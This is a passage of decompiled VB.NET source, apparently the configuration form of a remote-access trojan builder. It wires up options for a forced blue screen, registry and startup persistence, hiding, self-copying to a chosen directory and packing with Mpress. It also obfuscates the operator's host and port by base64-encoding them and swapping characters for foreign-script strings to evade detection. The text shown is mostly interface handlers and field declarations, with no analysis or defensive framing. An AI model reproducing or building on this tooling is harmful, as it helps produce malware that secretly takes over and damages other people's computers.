				Me.bsod.Checked = Conversions.ToBoolean(value)
				Dim value2 As String = File.ReadAllText("Stubs\regch.egg")
				Me.Isu.Checked = Conversions.ToBoolean(value2)
				Dim value3 As String = File.ReadAllText("Stubs\startupch.egg")
				Me.Isf.Checked = Conversions.ToBoolean(value3)
				Dim value4 As String = File.ReadAllText("Stubs\Hide.egg")
				Me.CheckBox6.Checked = Conversions.ToBoolean(value4)
				Dim value5 As String = File.ReadAllText("Stubs\copy.egg")
				Me.Idr.Checked = Conversions.ToBoolean(value5)
				Dim value6 As String = File.ReadAllText("Stubs\task.egg")
				Me.CheckBox2.Checked = Conversions.ToBoolean(value6)
				Dim value7 As String = File.ReadAllText("Stubs\Mpress.egg")
				Me.CheckBox4.Checked = Conversions.ToBoolean(value7)
			End If
			Me.P.Text = Conversions.ToString(Conversions.ToDecimal(Class6.smethod_2("p", Conversions.ToString(Me.P.Text))))
			If Convert.ToDouble(Me.P.Text) <> Conversions.ToDouble(Class6.smethod_2("port", Conversions.ToString(Me.P.Text))) Then
				Me.P.Text = Conversions.ToString(Conversions.ToDecimal(Class6.smethod_2("port", Conversions.ToString(Me.P.Text))))
			End If
		End Sub

		' Token: 0x0600010B RID: 267 RVA: 0x000028A0 File Offset: 0x00000AA0
		Private Sub VN_TextChanged(sender As Object, e As EventArgs)
			Me.TextBox4.Text = Convert.ToBase64String(Encoding.ASCII.GetBytes(Me.VN.Text))
		End Sub

		' Token: 0x0600010C RID: 268 RVA: 0x000028C7 File Offset: 0x00000AC7
		Private Sub Isf_CheckedChanged(sender As Object, e As EventArgs)
			If Me.Isf.Checked Then
				Me.TextBox1.Enabled = True
			ElseIf Not Me.Isf.Checked Then
				Me.TextBox1.Enabled = False
			End If
		End Sub

		' Token: 0x0600010D RID: 269 RVA: 0x00002900 File Offset: 0x00000B00
		Private Sub Isu_CheckedChanged(sender As Object, e As EventArgs)
			If Me.Isu.Checked Then
				Me.TextBox2.Enabled = True
			ElseIf Not Me.Isu.Checked Then
				Me.TextBox2.Enabled = False
			End If
		End Sub

		' Token: 0x0600010E RID: 270 RVA: 0x00002939 File Offset: 0x00000B39
		Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox1.Checked Then
				Me.NumericUpDown1.Enabled = True
			ElseIf Not Me.CheckBox1.Checked Then
				Me.NumericUpDown1.Enabled = False
			End If
		End Sub

		' Token: 0x0600010F RID: 271 RVA: 0x00009D64 File Offset: 0x00007F64
		Private Sub Idr_CheckedChanged(sender As Object, e As EventArgs)
			If Me.Idr.Checked Then
				Me.exe.Enabled = True
				Me.dir.Enabled = True
			End If
			If Not Me.Idr.Checked Then
				Me.exe.Enabled = False
				Me.dir.Enabled = False
			End If
		End Sub

		' Token: 0x06000110 RID: 272 RVA: 0x00009DC0 File Offset: 0x00007FC0
		Private Sub host_TextChanged(sender As Object, e As EventArgs)
			If Me.E2.Checked Then
				Me.Host.Text = Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Convert.ToBase64String(Encoding.UTF8.GetBytes(Me.H.Text)), "M", "विनी", 1, -1, CompareMethod.Binary), "=", "!", 1, -1, CompareMethod.Binary), "T", "蒂", 1, -1, CompareMethod.Binary), "A", "मे", 1, -1, CompareMethod.Binary), "Z", "बीपी", 1, -1, CompareMethod.Binary)
			End If
		End Sub

		' Token: 0x06000111 RID: 273 RVA: 0x00009E5C File Offset: 0x0000805C
		Private Sub E2_CheckedChanged(sender As Object, e As EventArgs)
			If Me.E2.Checked Then
				Me.Host.Text = Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Convert.ToBase64String(Encoding.UTF8.GetBytes(Me.H.Text)), "M", "विनी", 1, -1, CompareMethod.Binary), "=", "!", 1, -1, CompareMethod.Binary), "T", "蒂", 1, -1, CompareMethod.Binary), "A", "मे", 1, -1, CompareMethod.Binary), "Z", "बीपी", 1, -1, CompareMethod.Binary)
				Me.Port.Text = Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Convert.ToBase64String(Encoding.UTF8.GetBytes(Me.P.Text)), "M", "粹", 1, -1, CompareMethod.Binary), "T", "ता", 1, -1, CompareMethod.Binary), "A", "의도", 1, -1, CompareMethod.Binary), "e", "에", 1, -1, CompareMethod.Binary)
			Else
				Me.Host.Clear()
				Me.Port.Clear()
			End If
		End Sub

		' Token: 0x06000112 RID: 274 RVA: 0x00009F80 File Offset: 0x00008180
		Private Sub P_TextChanged(sender As Object, e As EventArgs)
			If Me.E2.Checked Then
				Me.Port.Text = Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Convert.ToBase64String(Encoding.UTF8.GetBytes(Me.P.Text)), "M", "粹", 1, -1, CompareMethod.Binary), "T", "ता", 1, -1, CompareMethod.Binary), "A", "의도", 1, -1, CompareMethod.Binary), "e", "에", 1, -1, CompareMethod.Binary)
			End If
		End Sub

		' Token: 0x0400004D RID: 77
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x0400004F RID: 79
		<AccessedThroughProperty("GroupBox2")>
		Private _GroupBox2 As GroupBox

		' Token: 0x04000050 RID: 80
		<AccessedThroughProperty("VN")>
		Private _VN As TextBox

		' Token: 0x04000051 RID: 81
		<AccessedThroughProperty("Label1")>
		Private _Label1 As Label

		' Token: 0x04000052 RID: 82
		<AccessedThroughProperty("H")>
		Private _H As TextBox

		' Token: 0x04000053 RID: 83
		<AccessedThroughProperty("Label2")>
		Private _Label2 As Label

		' Token: 0x04000054 RID: 84
		<AccessedThroughProperty("Label5")>
		Private _Label5 As Label

		' Token: 0x04000055 RID: 85
		<AccessedThroughProperty("Label6")>
		Private _Label6 As Label

		' Token: 0x04000056 RID: 86
		<AccessedThroughProperty("klen")>
		Private _klen As NumericUpDown

		' Token: 0x04000057 RID: 87
		<AccessedThroughProperty("GroupBox1")>
		Private _GroupBox1 As GroupBox

		' Token: 0x04000058 RID: 88
		<AccessedThroughProperty("Label3")>
		Private _Label3 As Label

		' Token: 0x04000059 RID: 89
		<AccessedThroughProperty("exe")>
		Private _exe As TextBox

		' Token: 0x0400005A RID: 90
		<AccessedThroughProperty("Label4")>
		Private _Label4 As Label

		' Token: 0x0400005B RID: 91
		<AccessedThroughProperty("dir")>
		Private _dir As ComboBox

		' Token: 0x0400005C RID: 92
		<AccessedThroughProperty("Idr")>
		Private _Idr As CheckBox

		' Token: 0x0400005D RID: 93
		<AccessedThroughProperty("GroupBox3")>
		Private _GroupBox3 As GroupBox

		' Token: 0x0400005E RID: 94
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x0400005F RID: 95
		<AccessedThroughProperty("bsod")>
		Private _bsod As CheckBox

		' Token: 0x04000060 RID: 96
		<AccessedThroughProperty("Isu")>
		Private _Isu As CheckBox

		' Token: 0x04000061 RID: 97
		<AccessedThroughProperty("Isf")>
		Private _Isf As CheckBox

		' Token: 0x04000062 RID: 98
		<AccessedThroughProperty("TextBox1")>
		Private _TextBox1 As TextBox

		' Token: 0x04000063 RID: 99
		<AccessedThroughProperty("TextBox3")>
		Private _TextBox3 As TextBox

		' Token: 0x04000064 RID: 100
		<AccessedThroughProperty("Label7")>
		Private _Label7 As Label

		' Token: 0x04000065 RID: 101
		<AccessedThroughProperty("TextBox2")>
		Private _TextBox2 As TextBox

		' Token: 0x04000066 RID: 102
		<AccessedThroughProperty("NumericUpDown1")>
		Private _NumericUpDown1 As NumericUpDown

		' Token: 0x04000067 RID: 103
		<AccessedThroughProperty("CheckBox1")>
		Private _CheckBox1 As CheckBox

		' Token: 0x04000068 RID: 104
		<AccessedThroughProperty("TextBox4")>
		Private _TextBox4 As TextBox

		' Token: 0x04000069 RID: 105
		<AccessedThroughProperty("CheckBox2")>
		Private _CheckBox2 As CheckBox

		' Token: 0x0400006A RID: 106
		<AccessedThroughProperty("GroupBox4")>
		Private _GroupBox4 As GroupBox

		' Token: 0x0400006B RID: 107
		<AccessedThroughProperty("CheckBox6")>
		Private _CheckBox6 As CheckBox

		' Token: 0x0400006C RID: 108
		<AccessedThroughProperty("Host")>
		Private _Host As TextBox

		' Token: 0x0400006D RID: 109
		<AccessedThroughProperty("Port")>
		Private _Port As TextBox

		' Token: 0x0400006E RID: 110
		<AccessedThroughProperty("E2")>
		Private _E2 As CheckBox

		' Token: 0x0400006F RID: 111
		<AccessedThroughProperty("GroupBox5")>
		Private _GroupBox5 As GroupBox

		' Token: 0x04000070 RID: 112
		<AccessedThroughProperty("Label10")>
		Private _Label10 As Label

		' Token: 0x04000071 RID: 113
		<AccessedThroughProperty("Label9")>
		Private _Label9 As Label

		' Token: 0x04000072 RID: 114
		<AccessedThroughProperty("Label8")>
		Private _Label8 As Label

		' Token: 0x04000073 RID: 115
		<AccessedThroughProperty("P")>
		Private _P As TextBox

		' Token: 0x04000074 RID: 116
		<AccessedThroughProperty("GroupBox6")>
		Private _GroupBox6 As GroupBox

		' Token: 0x04000075 RID: 117
		<AccessedThroughProperty("CheckBox4")>
		Private _CheckBox4 As RadioButton

		' Token: 0x04000076 RID: 118
		<AccessedThroughProperty("Label11")>
		Private _Label11 As Label

		' Token: 0x04000077 RID: 119
		<AccessedThroughProperty("RadioButton1")>
		Private _RadioButton1 As RadioButton

		' Token: 0x04000078 RID: 120
		Private ic As String
	End Class
End Namespace
